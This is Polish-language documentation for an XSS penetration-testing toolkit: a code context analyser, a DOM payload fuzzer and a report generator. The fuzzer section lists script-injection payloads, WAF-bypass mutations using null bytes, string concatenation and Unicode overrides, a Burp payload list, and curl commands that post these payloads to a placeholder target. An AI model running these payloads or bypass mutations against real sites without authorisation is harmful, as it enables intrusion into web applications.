# 🧠 XSS Vibes - AI Tools Documentation

## 📖 Przegląd

XSS Vibes zawiera 3 zaawansowane AI tools do inteligentnego testowania XSS:

1. **🎯 AI Context Extractor** - Analizuje kod JS/HTML i podpowiada optymalne templates + konteksty
2. **🤖 AI DOM Fuzzer** - Automatycznie wybiera fuzz payloady do useEffect, shadowRoot, eval, itp.
3. **📊 AI Report Generator** - Generuje profesjonalne HTML raporty per template, per payload, per wynik

---

## 🎯 AI CONTEXT EXTRACTOR

### 📁 Lokalizacja
```
scripts/ai_context_extractor.py
```

### 🎯 Cel
Inteligentna analiza plików JavaScript/HTML w celu:
- Wykrycia kontekstów XSS (React hooks, Shadow DOM, eval, templates)
- Oceny poziomu ryzyka (0-100)
- Rekomendacji najlepszych templates do testowania
- Generowania szczegółowych raportów kontekstów

### 🔧 Funkcje

#### 1. **Pattern Detection Engine**
- **React Patterns:** useEffect, useState, dangerouslySetInnerHTML, JSX injection
- **Modern Web:** Shadow DOM, Web Components, Service Workers
- **Template Engines:** Handlebars, Mustache, EJS, Pug
- **DOM Sinks:** innerHTML, outerHTML, document.write, insertAdjacentHTML
- **Eval Contexts:** eval(), Function(), setTimeout string, setInterval string
- **Event Handlers:** onclick, onload, onerror, postMessage
- **Storage APIs:** localStorage, sessionStorage, IndexedDB

#### 2. **Risk Scoring Algorithm**
```python
# Risk factors:
- High-risk patterns: +20 points each (eval, dangerouslySetInnerHTML)
- Medium-risk patterns: +15 points each (innerHTML, setTimeout)
- Low-risk patterns: +10 points each (addEventListener)
- Context multipliers: React (+1.5x), Angular (+1.3x), Vue (+1.2x)
- Sink density: More sinks = higher risk
- Dynamic execution: eval/Function contexts = +25 bonus
```

#### 3. **Template Recommendations**
```python
# Confidence scoring:
confidence = (matched_patterns / total_patterns) * 100
priority = base_priority + risk_multiplier
```

### 📋 Użycie

#### Podstawowe komendy:
```bash
# Analiza pojedynczego pliku
python3 scripts/ai_context_extractor.py file.js

# Analiza katalogu (rekursywnie)
python3 scripts/ai_context_extractor.py /path/to/js/files

# Tylko pliki o wysokim ryzyku
python3 scripts/ai_context_extractor.py /app/src --min-risk 80

# Export do JSON
python3 scripts/ai_context_extractor.py file.js --output analysis.json

# Verbose mode z debugiem
python3 scripts/ai_context_extractor.py file.js --verbose
```

#### Zaawansowane opcje:
```bash
# Filtrowanie po typach plików
python3 scripts/ai_context_extractor.py /app --include "*.js,*.jsx,*.ts,*.tsx"

# Wykluczenie katalogów
python3 scripts/ai_context_extractor.py /app --exclude "node_modules,dist,build"

# Limit głębokości skanowania
python3 scripts/ai_context_extractor.py /app --max-depth 3
```

### 📊 Format wyjściowy

#### Console Output:
```bash
🧠 XSS Vibes - AI Context Extractor
==================================================
📄 Analyzing file: components/UserProfile.jsx

# 🧠 XSS Vibes - AI Context Analysis Report

## 📄 File Information
- **File**: components/UserProfile.jsx
- **Size**: 1,248 bytes
- **Lines**: 45

## 🎯 Risk Assessment
- **Score**: 95/100
- **Level**: CRITICAL

### Risk Factors:
- High-risk pattern: react (dangerouslySetInnerHTML detected)
- High-risk pattern: eval_contexts (eval() call found)
- Medium-risk pattern: dom_sinks (innerHTML usage)
- DOM sinks found: 2
- Dynamic execution: 1

## 🎯 Template Suggestions

### 1. react_binding
- **Confidence**: 90%
- **Priority**: 9/10
- **Reason**: React patterns detected
- **Contexts**: dangerouslySetInnerHTML, JSX injection, React DOM

### 2. dom_sinks  
- **Confidence**: 75%
- **Priority**: 8/10
- **Reason**: DOM manipulation sinks
- **Contexts**: innerHTML, outerHTML, insertAdjacentHTML

## 🔍 Detected Contexts

### React Hooks
- useEffect(() => { setData(userInput) }, [])
- useState with dangerous values

### DOM Sinks
- {'sink': 'innerHTML', 'value': 'userContent'}
- {'sink': 'dangerouslySetInnerHTML', 'value': '__html: processedData'}

### Dynamic Execution  
- eval(userConfig)

## 💡 Recommendations
- 🎯 PRIMARY: Use template 'react_binding' (confidence: 90%)
- 🔥 Test dangerouslySetInnerHTML with React-specific payloads
- ⚡ Test eval context with code injection payloads  
- 🔸 Consider CSP bypass techniques for this React app
```

#### JSON Output:
```json
{
  "file_info": {
    "path": "components/UserProfile.jsx",
    "size": 1248,
    "lines": 45,
    "language": "javascript"
  },
  "risk_assessment": {
    "score": 95,
    "level": "CRITICAL",
    "factors": [
      {"pattern": "react", "risk": "high", "matches": 3},
      {"pattern": "eval_contexts", "risk": "high", "matches": 1},
      {"pattern": "dom_sinks", "risk": "medium", "matches": 2}
    ],
    "dom_sinks_count": 2,
    "dynamic_execution_count": 1
  },
  "template_suggestions": [
    {
      "name": "react_binding",
      "confidence": 90,
      "priority": 9,
      "reason": "React patterns detected",
      "contexts": ["dangerouslySetInnerHTML", "JSX injection", "React DOM"]
    },
    {
      "name": "dom_sinks", 
      "confidence": 75,
      "priority": 8,
      "reason": "DOM manipulation sinks",
      "contexts": ["innerHTML", "outerHTML", "insertAdjacentHTML"]
    }
  ],
  "detected_contexts": {
    "react_hooks": [
      "useEffect(() => { setData(userInput) }, [])"
    ],
    "dom_sinks": [
      {"sink": "innerHTML", "value": "userContent"},
      {"sink": "dangerouslySetInnerHTML", "value": "__html: processedData"}
    ],
    "dynamic_execution": [
      "eval(userConfig)"
    ]
  },
  "recommendations": [
    "Use template 'react_binding' as primary choice",
    "Test dangerouslySetInnerHTML with React payloads",
    "Test eval context with code injection"
  ]
}
```

---

## 🤖 AI DOM FUZZER

### 📁 Lokalizacja
```
xss_vibes/ai_domfuzz.py
```

### 🎯 Cel
Inteligentne generowanie payloadów XSS dostosowanych do wykrytych kontekstów DOM:
- Automatyczny wybór payloadów dla konkretnych kontekstów
- Zaawansowane mutacje WAF bypass
- Targetowanie React hooks, Shadow DOM, eval, itp.
- Scoring pokrycia testowania

### 🔧 Funkcje

#### 1. **Context Detection Engine**
```python
# Wykrywane konteksty:
context_patterns = {
    "useEffect": {
        "patterns": [
            r"useEffect\s*\(\s*\(\s*\)\s*=>\s*\{([^}]+)\}",
            r"React\.useEffect"
        ],
        "priority": 9
    },
    "shadowRoot": {
        "patterns": [
            r"shadowRoot\.innerHTML",
            r"attachShadow",
            r"customElements\.define"
        ],
        "priority": 8
    },
    "eval_contexts": {
        "patterns": [
            r"eval\s*\(",
            r"Function\s*\(",
            r"setTimeout\s*\(\s*[\"']",
            r"setInterval\s*\(\s*[\"']"
        ],
        "priority": 10
    }
}
```

#### 2. **Payload Selection Algorithm**
```python
# Inteligentne dopasowanie payloadów:
1. Wykryj konteksty w kodzie
2. Załaduj payloady z kategorii odpowiadających kontekstom
3. Priorytetyzuj payloady wg ważności kontekstu
4. Usuń duplikaty zachowując kolejność
5. Wygeneruj mutacje dla najlepszych payloadów
```

#### 3. **Advanced Mutation Strategies**
```python
mutation_strategies = {
    "waf_bypass": [
        "null_byte_injection",      # scr\x00ipt
        "string_concatenation",     # window["ale"+"rt"]
        "alternative_execution",    # setTimeout(alert,0,1)
        "dom_clobbering",          # <form><input name=attributes>
        "template_literals"         # alert`1`
    ],
    "unicode_bypass": [
        "unicode_overrides",        # \u202e...\u202d
        "combining_characters",     # a\u0300lert
        "alternative_unicode"       # \u0073cript
    ],
    "advanced_encoding": [
        "double_encoding",          # %25%3C
        "mixed_encoding",           # &#x3C;&#60;
        "base64_data_urls",        # data:text/html;base64,...
        "javascript_schemes"        # javascript:...
    ]
}
```

### 📋 Użycie

#### Podstawowe komendy:
```bash
# Analiza pliku z automatycznym wykrywaniem kontekstów
python3 xss_vibes/ai_domfuzz.py --input components/App.js

# Analiza bezpośrednio z kodu
python3 xss_vibes/ai_domfuzz.py --content "useEffect(() => eval(userInput), [])"

# Ograniczenie liczby payloadów
python3 xss_vibes/ai_domfuzz.py --input file.js --max-payloads 20
```

#### Targetowanie kontekstów:
```bash
# Konkretne konteksty
python3 xss_vibes/ai_domfuzz.py --input file.js \
  --contexts useEffect,shadowRoot,eval_contexts

# Wszystkie React konteksty
python3 xss_vibes/ai_domfuzz.py --input file.js \
  --contexts useEffect,useState,jsx_contexts

# DOM manipulation contexts
python3 xss_vibes/ai_domfuzz.py --input file.js \
  --contexts innerHTML_sinks,attribute_sinks,template_contexts
```

#### Mutacje WAF bypass:
```bash
# Zaawansowane WAF bypass
python3 xss_vibes/ai_domfuzz.py --input file.js \
  --mutations waf_bypass,unicode_bypass,advanced_encoding

# Tylko Unicode bypass
python3 xss_vibes/ai_domfuzz.py --input file.js \
  --mutations unicode_bypass

# Kombinacja strategii
python3 xss_vibes/ai_domfuzz.py --input file.js \
  --mutations waf_bypass,case_variation,obfuscation
```

#### Formaty eksportu:
```bash
# JSON (domyślny)
python3 xss_vibes/ai_domfuzz.py --input file.js --format json --output payloads.json

# Burp Suite format
python3 xss_vibes/ai_domfuzz.py --input file.js --format burp --output burp_payloads.txt

# cURL commands
python3 xss_vibes/ai_domfuzz.py --input file.js --format curl --output test_commands.sh

# Plain text
python3 xss_vibes/ai_domfuzz.py --input file.js --format txt --output payloads.txt
```

### 📊 Format wyjściowy

#### Console Output:
```bash
🧠 XSS Vibes - AI DOM Fuzzer
==================================================
📊 Analysis Results:
   Detected contexts: 3
   Selected payloads: 15
   Coverage score: 85.2%

🎯 Top Contexts:
   eval_contexts (priority: 10, matches: 1)
   useEffect (priority: 9, matches: 2)
   shadowRoot (priority: 8, matches: 1)

💡 Recommendations:
   🚨 HIGH PRIORITY: Focus on 3 critical contexts
     🎯 eval_contexts: Dynamic code execution
     🎯 useEffect: React useEffect hook injection
     🎯 shadowRoot: Shadow DOM injection
   🔀 Generated 8 payload mutations for bypass attempts
   ⚠️  1 contexts have no specific payloads
   💡 Consider adding custom payloads for these contexts
   ⚡ Detected eval contexts - prioritize code injection payloads
   ⚛️  React hooks detected - test component lifecycle injection
   🌑 Shadow DOM detected - test encapsulation bypass
```

#### JSON Output:
```json
{
  "metadata": {
    "total_payloads": 15,
    "contexts": 3,
    "coverage_score": 85.2,
    "mutation_strategies": ["waf_bypass", "unicode_bypass"]
  },
  "detected_contexts": [
    {
      "context": "eval_contexts",
      "priority": 10,
      "matches": 1,
      "description": "Dynamic code execution"
    },
    {
      "context": "useEffect", 
      "priority": 9,
      "matches": 2,
      "description": "React useEffect hook injection"
    }
  ],
  "payloads": [
    {
      "payload": "\"><script>alert(1)</script>",
      "context": "eval_contexts",
      "priority": 10,
      "description": "Dynamic code execution",
      "original": true
    },
    {
      "payload": "\"><scr\\u0000ipt>window[\"ale\"+\"rt\"](1)</scr\\u0000ipt>",
      "context": "eval_contexts",
      "priority": 9,
      "description": "Dynamic code execution (Advanced WAF bypass techniques)",
      "original": false,
      "mutation_strategy": "waf_bypass"
    },
    {
      "payload": "\\u202e<script>alert(1)</script>\\u202d",
      "context": "eval_contexts",
      "priority": 9,
      "description": "Dynamic code execution (Unicode normalization bypass)",
      "original": false,
      "mutation_strategy": "unicode_bypass"
    }
  ],
  "recommendations": [
    "Focus on 3 critical contexts detected",
    "Test eval contexts with code injection payloads",
    "Test React hooks with component lifecycle injection",
    "Test Shadow DOM with encapsulation bypass"
  ]
}
```

#### Burp Suite Format:
```txt
# Burp Suite Payload List
# Generated by XSS Vibes AI DOM Fuzzer

"><script>alert(1)</script>
"><scr\u0000ipt>window["ale"+"rt"](1)</scr\u0000ipt>
\u202e<script>alert(1)</script>\u202d
useEffect(() => alert(1), [])
shadowRoot.innerHTML = '<script>alert(1)</script>'
```

#### cURL Commands:
```bash
#!/bin/bash
# XSS Vibes - cURL Test Commands

# Test 1: eval_contexts
curl -X POST 'TARGET_URL' -d 'param="><script>alert(1)</script>'

# Test 2: eval_contexts (WAF bypass)
curl -X POST 'TARGET_URL' -d 'param="><scr\u0000ipt>window[\"ale\"+\"rt\"](1)</scr\u0000ipt>'

# Test 3: eval_contexts (Unicode bypass)
curl -X POST 'TARGET_URL' -d 'param=\u202e<script>alert(1)</script>\u202d'
```

---

## 📊 AI REPORT GENERATOR

### 📁 Lokalizacja
```
scripts/report_gen.py
```

### 🎯 Cel
Generowanie profesjonalnych raportów HTML z wyników testowania XSS:
- Comprehensive reports - pełne raporty ze wszystkich testów
- Template reports - raporty per konkretny template
- Payload reports - analiza per konkretny payload
- Interactive charts i professional layout

### 🔧 Funkcje

#### 1. **Report Types**
```python
report_types = {
    "comprehensive": "Pełny raport ze wszystkich testów z wykresami",
    "template": "Raport skupiony na konkretnym template", 
    "payload": "Analiza konkretnego payload z wynikami"
}
```

#### 2. **Interactive Features**
- **Sortowalne tabele** - sortowanie per kolumna
- **Filtrowalne wyniki** - filtrowanie per status/template/payload
- **Interaktywne wykresy** - Chart.js charts
- **Responsive design** - działa na mobile i desktop
- **Export functions** - CSV, JSON export z raportu

#### 3. **Professional Layout**
- **Executive summary** - podsumowanie dla managementu
- **Technical details** - szczegóły dla technical team
- **Evidence screenshots** - placeholder dla screenshots
- **Remediation suggestions** - rekomendacje naprawy

### 📋 Użycie

#### Podstawowe komendy:
```bash
# Comprehensive report
python3 scripts/report_gen.py --results-file results.json --report-type comprehensive

# Template-specific report
python3 scripts/report_gen.py --results-file results.json --report-type template --template react_binding

# Payload-specific report  
python3 scripts/report_gen.py --results-file results.json --report-type payload --payload "<script>alert(1)</script>"

# Custom output directory
python3 scripts/report_gen.py --results-file results.json --report-type comprehensive --output-dir /var/www/html/reports
```

### 📊 Format danych wejściowych

#### Wymagana struktura JSON:
```json
{
  "session": {
    "session_id": "pentest-app-001",
    "start_time": "2025-01-29T10:00:00Z",
    "end_time": "2025-01-29T12:30:00Z",
    "target_urls": ["https://app.example.com"],
    "total_tests": 150,
    "successful_tests": 127,
    "failed_tests": 23,
    "vulnerabilities_found": 8,
    "templates_used": ["react_binding", "dom_sinks", "web_components"],
    "payload_categories": ["eval_injection", "react_hooks", "waf_bypass"]
  },
  "results": [
    {
      "payload": "\"><script>alert(1)</script>",
      "template": "react_binding",
      "url": "https://app.example.com/profile",
      "method": "POST", 
      "parameter": "bio",
      "status_code": 200,
      "response_time": 1.2,
      "content_length": 2048,
      "reflected": true,
      "executed": true,
      "waf_blocked": false,
      "evidence": "JavaScript alert executed in React component",
      "timestamp": "2025-01-29T10:15:00Z"
    }
  ]
}
```

### 📋 Wygenerowane raporty

#### 1. Comprehensive Report
**Plik:** `xss_vibes_comprehensive_YYYYMMDD_HHMMSS.html`

**Zawartość:**
- **📊 Executive Summary**
  - Vulnerability count per severity
  - Success rate charts
  - Template effectiveness analysis
  - Timeline of testing
  
- **🎯 Payload Analysis** 
  - Top performing payloads
  - WAF bypass success rates
  - Payload category breakdown
  - Mutation strategy effectiveness

- **🔍 Template Breakdown**
  - Per-template success rates
  - Context coverage analysis
  - Template recommendations

- **📈 Statistical Analysis**
  - Response time analysis
  - Status code distribution
  - Parameter vulnerability analysis
  - WAF detection rates

- **📋 Detailed Results Table**
  - Sortowalna tabela wszystkich testów
  - Filtrowalne per status/template/payload
  - Evidence i technical details
  - Export do CSV/JSON

#### 2. Template Report  
**Plik:** `xss_vibes_template_{template_name}_YYYYMMDD_HHMMSS.html`

**Zawartość:**
- **Template Overview** - szczegóły konkretnego template
- **Payload Performance** - które payloady działały najlepiej
- **Context Analysis** - analiza kontekstów dla tego template
- **Specific Recommendations** - rekomendacje dla tego template

#### 3. Payload Report
**Plik:** `xss_vibes_payload_{hash}_YYYYMMDD_HHMMSS.html`

**Zawartość:**
- **Payload Analysis** - szczegółowa analiza konkretnego payload
- **Success Statistics** - statystyki sukcesu per target/parameter
- **Variation Testing** - wyniki różnych mutacji payload
- **Context Effectiveness** - w jakich kontekstach payload działa

---

## 🔥 INTEGRACJA AI TOOLS

### CLI Integration
```bash
# Dostępne przez xss_vibes/ai_commands.py:
python3 -m xss_vibes ai-extract file.js
python3 -m xss_vibes ai-fuzz --input file.js --contexts useEffect
python3 -m xss_vibes ai-report --results results.json
```

### Workflow Scripts
```bash
# scripts/ai_workflow.sh - kompletny AI workflow
#!/bin/bash
./ai_workflow.sh target.js "https://app.example.com" report_output/
```

### Integration z istniejącymi tools
```bash
# Użycie AI payloadów w standardowym skanowaniu
python3 xss_vibes/ai_domfuzz.py --input app.js --output ai_payloads.json
xss-scan https://target.com --payloads ai_payloads.json
```

---

## 📈 METRYKI I MONITORING

### Coverage Metrics
- **Context Coverage:** % wykrytych kontekstów vs dostępne
- **Payload Diversity:** Różnorodność wygenerowanych payloadów  
- **Mutation Effectiveness:** Skuteczność mutacji WAF bypass
- **Template Accuracy:** Dokładność rekomendacji template

### Performance Metrics  
- **Analysis Speed:** Czas analizy pliku/katalogu
- **Payload Generation:** Czas generowania payloadów
- **Report Generation:** Czas tworzenia raportów
- **Memory Usage:** Zużycie pamięci podczas operacji

### Quality Metrics
- **False Positive Rate:** % błędnych wykryć kontekstów
- **Recommendation Accuracy:** Skuteczność sugestii template
- **Risk Score Correlation:** Korelacja risk score z rzeczywistymi vulnerability

---

## 🛠️ ROZSZERZANIE AI TOOLS

### Dodawanie nowych pattern detection
```python
# W ai_context_extractor.py:
new_patterns = {
    "custom_framework": {
        "patterns": [r"customLib\.render\s*\(", r"framework\.inject"],
        "risk_weight": 15,
        "suggested_templates": ["custom_template"]
    }
}
```

### Dodawanie nowych kontekstów w fuzzer
```python  
# W ai_domfuzz.py:
new_contexts = {
    "custom_context": {
        "patterns": [r"customAPI\.execute\s*\("],
        "payload_types": ["custom_payloads"],
        "priority": 7,
        "description": "Custom API injection"
    }
}
```

### Dodawanie nowych mutation strategies
```python
# W ai_domfuzz.py:
new_mutations = {
    "custom_bypass": {
        "description": "Custom WAF bypass technique",
        "mutations": [
            lambda p: p.replace("script", "scr'+'ipt"),
            lambda p: f"/*custom*/{p}/*bypass*/"
        ]
    }
}
```

---

## 🔍 TROUBLESHOOTING

### Częste problemy

#### 1. Brak wykrycia kontekstów
```bash
# Problem: AI DOM Fuzzer nie wykrywa kontekstów
# Rozwiązanie: Sprawdź pattern matching
python3 -c "
import re
content = 'Twój kod'
pattern = r'useEffect\s*\('
print('Matches:', re.findall(pattern, content))
"
```

#### 2. Błędy w formacie JSON
```bash
# Problem: Report generator nie może sparsować JSON
# Rozwiązanie: Walidacja JSON
python3 -c "import json; json.load(open('results.json'))"
```

#### 3. Performance issues
```bash
# Problem: Długi czas analizy dużych plików
# Rozwiązanie: Użyj limitów
python3 scripts/ai_context_extractor.py large_file.js --max-depth 2 --timeout 30
```

### Debug mode
```bash
# Verbose output dla debugowania
python3 scripts/ai_context_extractor.py file.js --verbose
python3 xss_vibes/ai_domfuzz.py --input file.js --debug
```

---

## ✅ VALIDATION & TESTING

### Unit Tests
```bash
# Testy AI tools
python3 -m pytest tests/test_ai_context_extractor.py
python3 -m pytest tests/test_ai_domfuzz.py  
python3 -m pytest tests/test_report_gen.py
```

### Integration Tests
```bash
# Test kompletnego workflow
./tests/ai_workflow_integration_test.sh
```

### Performance Benchmarks
```bash  
# Benchmark speed i accuracy
python3 tests/ai_performance_benchmark.py
```

---

## 📚 DODATKOWE ZASOBY

### Example Files
- `examples/ai_demo_react.js` - Demo React component z vulnerability
- `examples/ai_demo_results.json` - Example wyniki dla report generator  
- `examples/ai_workflow_demo.sh` - Script demonstracyjny workflow

### Video Tutorials
- AI Context Extraction Demo
- AI DOM Fuzzing Walkthrough  
- Report Generation Tutorial
- Complete AI Workflow Demo

### API Documentation
- [AI Context Extractor API](docs/api/ai_context_extractor.md)
- [AI DOM Fuzzer API](docs/api/ai_domfuzz.md)
- [Report Generator API](docs/api/report_gen.md)
